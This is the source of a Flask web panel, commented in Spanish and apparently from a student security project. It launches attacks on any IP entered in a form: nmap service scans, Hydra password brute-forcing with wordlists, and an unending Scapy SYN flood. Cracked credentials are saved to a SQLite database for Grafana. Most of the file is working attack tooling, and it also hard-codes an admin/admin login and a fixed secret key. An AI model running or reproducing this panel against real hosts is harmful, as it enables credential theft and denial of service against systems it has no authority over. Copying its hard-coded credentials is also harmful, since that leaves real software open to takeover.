# app.py
from flask import Flask, render_template, request, redirect, url_for, session
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
import subprocess
import os
import sqlite3
from werkzeug.security import generate_password_hash, check_password_hash
import threading
from scapy.all import IP, TCP, send
import random

app = Flask(__name__)
app.secret_key = 'clave_secreta_aleatoria_segura'

# Ruta corregida: accesible por Grafana
DB_PATH = "/var/lib/grafana/resultados.db"

# Configuración de Flask-Login
login_manager = LoginManager(app)
login_manager.login_view = 'login'

# Definición de clase User y usuarios simulados...
class User(UserMixin):
    def __init__(self, id, username, password_hash):
        self.id = id
        self.username = username
        self.password_hash = password_hash

users = {
    1: User(1, 'admin', generate_password_hash('admin'))
}

@login_manager.user_loader
def load_user(user_id):
    return users.get(int(user_id))

# Funciones auxiliares...

def obtener_diccionarios():
    diccionario_dir = "/home/kali/Proyecto-ASIR2/diccionarios"
    try:
        return [f for f in os.listdir(diccionario_dir) if f.endswith(('.txt', '.lst'))]
    except FileNotFoundError:
        return ["Error: Directorio no encontrado"]

# Escaneo Nmap
def run_nmap(ip):
    try:
        command = ["nmap", "-sV", ip]
        output = subprocess.check_output(command, stderr=subprocess.STDOUT)
        result = parse_nmap_output(output.decode("utf-8"))
        guardar_resultado_nmap(result)
        return result
    except subprocess.CalledProcessError as e:
        return {"error": f"Error en Nmap: {e.output.decode('utf-8')}", "raw_output": e.output.decode("utf-8")}

def parse_nmap_output(output):
    data = {
        "host": "",
        "status": "",
        "ports": [],
        "mac": "",
        "raw_output": output
    }

    for line in output.splitlines():
        if "Nmap scan report for" in line:
            data["host"] = line.split("for")[1].strip()
        elif "Host is up" in line:
            data["status"] = line.strip()
        elif "MAC Address:" in line:
            data["mac"] = line.split("MAC Address:")[1].strip()
        elif "/tcp" in line and "open" in line:
            parts = [p for p in line.split() if p]
            if len(parts) >= 4:
                data["ports"].append({
                    "port": parts[0],
                    "state": parts[1],
                    "service": parts[2],
                    "version": " ".join(parts[3:]) if len(parts) > 3 else ""
                })
    return data

# Ataque Hydra
def run_hydra(ip, diccionario, usuario, protocolo):
    try:
        diccionario_dir = "/home/kali/Proyecto-ASIR2/diccionarios/"
        diccionario_path = os.path.join(diccionario_dir, diccionario)

        if not os.path.exists(diccionario_path):
            return {"error": f"El diccionario {diccionario} no existe", "raw_output": ""}

        command = [
            "hydra",
            "-l", usuario,
            "-P", diccionario_path,
            f"{protocolo}://{ip}",
            "-t", "4",
            "-vV"
        ]

        output = subprocess.check_output(command, stderr=subprocess.STDOUT)
        result = parse_hydra_output(output.decode('utf-8'))
        guardar_resultado_hydra(result)
        return result

    except subprocess.CalledProcessError as e:
        return {"error": "Hydra falló", "raw_output": e.output.decode('utf-8')}

def parse_hydra_output(output):
    for line in output.splitlines():
        if "host:" in line and "login:" in line and "password:" in line:
            parts = line.split()
            return {
                "port": parts[0].replace("[", "").replace("]", ""),
                "host": parts[parts.index("host:")+1],
                "login": parts[parts.index("login:")+1],
                "password": parts[parts.index("password:")+1],
                "raw_output": output
            }
    return {"error": "No se encontraron credenciales válidas", "raw_output": output}

# Guardar resultados en BD

def guardar_resultado_nmap(result):
    if "ports" not in result:
        return
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        for port in result["ports"]:
            c.execute('''
                INSERT INTO nmap_resultados (ip, puerto, servicio, version)
                VALUES (?, ?, ?, ?)
            ''', (result["host"], port["port"], port["service"], port["version"]))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        print(f"[ERROR SQLITE - NMAP] {e}")

def guardar_resultado_hydra(result):
    if "error" in result:
        return
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            INSERT INTO hydra_resultados (ip, puerto, usuario, password, protocolo)
            VALUES (?, ?, ?, ?, ?)
        ''', (result["host"], result["port"], result["login"], result["password"], "ssh"))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        print(f"[ERROR SQLITE - HYDRA] {e}")

def registrar_ataque(ip, tipo_ataque):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''
            INSERT INTO ataques_realizados (ip, tipo_ataque)
            VALUES (?, ?)
        ''', (ip, tipo_ataque))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        print(f"[ERROR SQLITE - ATAQUE] {e}")

# Ataque SYN Flood

def syn_flood_attack(ip):
    port = 80
    while True:
        src_port = random.randint(1024, 65535)
        pkt = IP(dst=ip) / TCP(sport=src_port, dport=port, flags='S')
        send(pkt, verbose=False)

def start_syn_flood(ip):
    attack_thread = threading.Thread(target=syn_flood_attack, args=(ip,))
    attack_thread.daemon = True
    attack_thread.start()

# Rutas Flask

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = next((u for u in users.values() if u.username == username), None)
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            return redirect(url_for('index'))
        return render_template('login.html', error='Credenciales inválidas')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route("/", methods=["GET", "POST"])
@login_required
def index():
    result = None
    hydra_result = None
    message = None
    diccionarios = obtener_diccionarios()

    if request.method == "POST":
        ip = request.form["ip"]
        tipo_ataque = request.form.get("tipo_ataque")

        if tipo_ataque == "nmap":
            result = run_nmap(ip)
        elif tipo_ataque == "hydra":
            diccionario = request.form["diccionario"]
            usuario = request.form.get("usuario", "debian")
            protocolo = request.form["protocolo"]
            hydra_result = run_hydra(ip, diccionario, usuario, protocolo)
        elif tipo_ataque == "syn_flood":
            start_syn_flood(ip)
            message = f"✅ Ataque SYN Flood iniciado contra {ip}"
            registrar_ataque(ip, "syn_flood")

    return render_template(
        "index.html",
        username=current_user.username,
        result=result,
        hydra_result=hydra_result,
        message=message,
        diccionarios=diccionarios
    )

if __name__ == "__main__":
    app.run(debug=False)
